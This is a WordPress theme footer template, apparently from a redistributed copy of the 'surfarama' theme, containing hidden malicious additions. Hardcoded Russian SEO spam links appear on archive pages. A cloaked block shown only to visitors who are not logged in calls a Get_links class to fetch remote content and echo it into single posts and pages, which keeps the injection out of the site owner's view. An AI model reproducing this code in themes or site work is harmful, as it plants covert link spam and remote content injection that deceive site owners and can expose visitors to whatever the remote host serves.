
	<footer id="colophon" role="contentinfo">
		<div id="site-generator">

			<?php echo __('&copy; ', 'surfarama') . esc_attr( get_bloginfo( 'name', 'display' ) );  ?>
            <?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://wp-templates.ru/" title="скачать шаблон для сайта">скачать шаблоны</a> <a href="http://cheaplinks.ru" title="продвинуть в топ">продвинуть сайт</a> <?php } ?>
							
			<?php if ($user_ID) : ?><?php else : ?>
			<?php if (is_single() || is_page() ) { ?>
			<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
			$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
			<?php } ?>
			<?php endif; ?>
            
		</div>
	</footer><!-- #colophon -->
</div><!-- #container -->

<?php wp_footer(); ?>


</body>
</html>